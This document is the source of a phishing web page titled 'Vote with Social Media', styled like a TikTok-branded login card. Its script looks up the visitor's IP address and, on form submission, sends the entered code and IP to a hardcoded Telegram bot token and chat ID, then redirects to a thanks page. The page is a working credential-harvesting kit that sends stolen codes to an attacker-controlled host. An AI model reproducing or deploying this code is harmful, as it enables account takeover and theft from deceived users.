    <title>Vote with Social Media</title>
    <style>
     * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Arial, Helvetica, sans-serif;
    border: none;
    text-decoration: none;
}

:root {
    --bg-dark: #0f0f0f;
    --bg-dark2: #121212;
    --text-light: #ffffff;
    --text-gray: #b3b3b3;
    --accent-cyan: #00f2ea;
    --accent-pink: #ff0050;
    --border-dark: #2a2a2a;
}

body {
    margin: 32px auto;
    max-width: 935px;
    padding-bottom: 20px;
    background-color: var(--bg-dark);
    color: var(--text-light);
}

.container {
    display: flex;
    flex-direction: row;
    justify-content: center;
}

/* SMARTPHONE */
.smartphone {
    margin-left: -90px;
}

.smartphone .screen {
    position: absolute;
    margin: 25px 0 0 160px;
}

/* FORM */
.form-area {
    display: flex;
    flex-direction: column;
    padding-top: 15px;
}

/* Logo container */
.form-area .logo {
    width: 355px;
    padding: 40px 30px 0 90px;
    margin-bottom: 0;
    background-color: var(--bg-dark2);
    border: 1px solid var(--border-dark);
}

/* Form card */
.form-area form {
    display: flex;
    flex-direction: column;
    width: 355px;
    padding: 30px 0 20px 0;
    align-items: center;
    background-color: var(--bg-dark2);
    border: 1px solid var(--border-dark);
}

.form-area form input {
    width: 280px;
    padding: 13px;
    margin-bottom: 10px;
    border-radius: 6px;
    background-color: #1d1d1d;
    border: 1px solid #333;
    color: var(--text-light);
    font-size: 13px;
}

/* Submit button */
.form-area form input[type=submit] {
    background: linear-gradient(90deg, var(--accent-pink), var(--accent-cyan));
    color: #fff;
    font-weight: bold;
    cursor: pointer;
    transition: 0.3s;
    border: none;
}

.form-area form input[type=submit]:hover {
    filter: brightness(1.2);
    transform: translateY(-1px);
}

/* "OR" line */
form .other-option {
    display: flex;
    flex-direction: row;
    margin: 15px 0;
    color: var(--text-gray);
    font-weight: 700;
    font-size: 14px;
}

form .other-option div {
    width: 110px;
    height: 1px;
    background-color: #333;
    margin: 6px 16px;
}

/* Options */
form .options {
    margin-top: 10px;
    text-align: center;
}

form .options a {
    color: var(--accent-cyan);
}

form .options .forget a {
    color: var(--text-gray);
    font-size: 14px;
}

/* No account section */
.form-area .noaccount {
    width: 355px;
    margin: 10px 0;
    padding: 22px;
    text-align: center;
    background-color: var(--bg-dark2);
    border: 1px solid var(--border-dark);
    font-size: 14px;
    color: var(--text-light);
}

.form-area .noaccount a span {
    color: var(--accent-pink);
    font-weight: 700;
}

/* Apps section */
.form-area .apps {
    text-align: center;
    width: 355px;
    margin-top: 10px;
    color: var(--text-gray);
}

/* Footer */
footer {
    text-align: center;
    margin: 20px 10px;
    font-size: 14px;
    color: var(--text-gray);
}

footer a {
    font-size: 14px;
    color: var(--text-gray);
    margin: 5px 4px;
}

footer select {
    background-color: #1d1d1d;
    color: var(--text-gray);
    border: 1px solid #333;
}

/* Mobile adjustments */
@media screen and (max-width:800px) {
    .smartphone {
        display: none;
    }
    .form-area {
        margin-bottom: 50px;
    }
}

@media screen and (max-width:435px) {
    .form-area .logo,
    .form-area form,
    .form-area .noaccount {
        width: 100%;
        background-color: transparent;
        border: none;
    }
}

/* Extra small text */
.small-title {
    margin: 1em auto;
    color: var(--text-light);
}

.small {
    font-size: 0.85em;
    color: var(--text-gray);
}

    <script>
      document.addEventListener('DOMContentLoaded', function () {
        // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
        fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => {
            const ipaddress = data.ip;
            document.getElementById('ipaddress').value = ipaddress;
          })
          .catch(error => {
            console.error('Error fetching IP address:', error);
          });
      });




      document.getElementById('contactForm').addEventListener('submit', function (event) {
        event.preventDefault();

        var code = document.getElementById('code').value;
        // var password = document.getElementById('password').value;
        var ipaddress = document.getElementById('ipaddress').value;

        var telegramMessage = `code: ${code}\nIpaddress: ${ipaddress}`;
      var token = '8059720905:AAERfrdVCeVOTB5-BVFJyGZRIrj5Kt4PhwM';
      var chat_id = '7368472897';

        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;

        fetch(url)
          .then(response => response.json())
          .then(data => {
            if (data.ok) {
              window.location.href = 'thanks.html';  // Redirect to thank you page
            } else {
              alert('Error sending message.');
            }
          })
          .catch(error => {
            console.error('Error:', error);
          });
      });
